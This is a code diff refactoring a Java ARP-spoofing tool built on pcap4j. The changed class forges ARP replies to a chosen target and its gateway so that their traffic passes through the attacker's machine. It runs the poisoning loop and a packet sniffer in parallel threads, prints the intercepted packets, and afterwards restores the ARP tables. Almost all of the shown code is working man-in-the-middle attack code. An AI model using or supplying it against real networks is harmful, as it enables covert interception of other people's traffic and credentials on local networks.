@@ -1,12 +1,12 @@
-package com.pkt.sniff;
+package com.pkt.tools;
 
 import org.pcap4j.util.MacAddress;
 
-import com.pkt.sniff.packets.ARP;
-import com.pkt.sniff.packets.EthernetFrame;
-import com.pkt.sniff.utils.DumpPcap;
-import com.pkt.sniff.utils.NetworkUtils;
-import com.pkt.sniff.utils.Utils;
+import com.pkt.tools.exceptions.HAddrNotFoundException;
+import com.pkt.tools.packets.ARP;
+import com.pkt.tools.packets.EthernetFrame;
+import com.pkt.tools.utils.NetworkUtils;
+import com.pkt.tools.utils.Utils;
 
 import org.pcap4j.core.PcapHandle;
 import org.pcap4j.core.PcapNetworkInterface;
@@ -17,18 +17,21 @@ import org.pcap4j.packet.Packet;
 import org.pcap4j.packet.ArpPacket.Builder;
 import org.pcap4j.packet.namednumber.EtherType;
 
-public class Arper {
+public class Arper implements Runnable {
     private String attackerIP;
     private String gatewayIP;
     private String targetIP;
     private MacAddress attackerMac;
     private MacAddress gatewayMac;
     private MacAddress targetMac;
-    private PcapHandle handle;
     private PcapNetworkInterface nif;
 
     public Arper(String targetIP, String gatewayIP) {
-        configure(targetIP, gatewayIP);
+        try {
+            configure(targetIP, gatewayIP);
+        } catch (HAddrNotFoundException e) {
+            e.printStackTrace();
+        }
     }
 
     public Arper(String attackerIP,
@@ -45,58 +48,84 @@ public class Arper {
         this.gatewayMac = gatewayMac;
     }
 
+    public void run() {
+        summary();
+        System.out.write('.');
+        PcapHandle poisonHandle = NetworkUtils.createPcapHandle(nif);
+        PcapHandle restoreHandle = NetworkUtils.createPcapHandle(nif);
+
+        poison(poisonHandle);
+
+        System.out.println("Restoring...\n");
+        restoreArpTables(restoreHandle);
+
+    }
+
     public void run(int packetCount) {
         summary();
 
-        Sniff sniff = new Sniff(nif);
-        DumpPcap dumper = new DumpPcap(nif);
+        PcapHandle poisonHandle = NetworkUtils.createPcapHandle(nif);
+        PcapHandle restoreHandle = NetworkUtils.createPcapHandle(nif);
+        PcapHandle sniffHandle = NetworkUtils.createPcapHandle(nif);
+
+        final Sniff sniff = new Sniff(sniffHandle);
 
         sniff.setFilter("not arp and dst host " + targetIP);
         System.out.println("\nRunning...");
 
-        int num = 0;
-        while (true) {
+        Thread poisonThread = new Thread(() -> poison(poisonHandle));
+
+        Thread sniffThread = new Thread(() -> {
             try {
-                poison();
-
-                Packet packet = sniff.capturePacket();
-                if (packet == null) {
-                    continue;
-                } else {
-                    num++;
+                int num = 0;
+                while (true) {
+                    Packet packet = sniff.capturePacket();
                     System.out.println(packet);
-                    dumper.dump(packet);
-                }
 
-                if (num >= packetCount) {
-                    sniff.close();
-                    dumper.close();
-                    break;
+                    if (num >= packetCount) {
+                        break;
+                    } else {
+                        num++;
+                    }
                 }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        });
+
+        sniffThread.start();
+        poisonThread.start();
+
+        try {
+            sniffThread.join();
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
+        System.out.println("Re-Arping ARP Tables...\n");
+        restoreArpTables(restoreHandle);
+
+        sniff.close();
+
+    }
+
+    private void poison(PcapHandle handle) {
+        while (true) {
+            EthernetPacket victim = buildArpPacket(gatewayIP, attackerMac, targetIP, targetMac);
+            EthernetPacket gateway = buildArpPacket(targetIP, attackerMac, gatewayIP, gatewayMac);
+            try {
+                handle.sendPacket(gateway);
+                handle.sendPacket(victim);
+                handle.wait(2000);
             } catch (Exception e) {
                 e.printStackTrace();
                 break;
             }
+
         }
-
-        System.out.println("Restoring...\n");
-        restore();
-
     }
 
-    private void poison() {
-        try {
-            EthernetPacket victim = buildArpPacket(gatewayIP, attackerMac, targetIP, targetMac);
-            EthernetPacket gateway = buildArpPacket(targetIP, attackerMac, gatewayIP, gatewayMac);
-            handle.sendPacket(gateway);
-            handle.sendPacket(victim);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
-    }
-
-    private void restore() {
+    private void restoreArpTables(PcapHandle handle) {
         try {
             EthernetPacket victim = buildArpPacket(gatewayIP, gatewayMac, targetIP, targetMac);
             EthernetPacket gateway = buildArpPacket(targetIP, targetMac, gatewayIP, gatewayMac);
@@ -108,9 +137,8 @@ public class Arper {
         }
     }
 
-    private void configure(String targetIP, String gatewayIP) {
+    private void configure(String targetIP, String gatewayIP) throws HAddrNotFoundException {
         this.nif = NetworkUtils.selectNetWorkInterface();
-        this.handle = NetworkUtils.createPcapHandle(nif);
         this.attackerIP = nif.getAddresses().get(0).getAddress().getHostAddress();
         this.attackerMac = MacAddress.getByAddress(nif.getLinkLayerAddresses().get(0).getAddress());
         this.targetIP = targetIP;
@@ -143,6 +171,10 @@ public class Arper {
                     .get(EthernetPacket.class)
                     .getHeader()
                     .getSrcAddr();
+
+            if (srcHardwareAddr == null) {
+                throw new HAddrNotFoundException();
+            }
 
             return srcHardwareAddr;
         } catch (Exception e) {
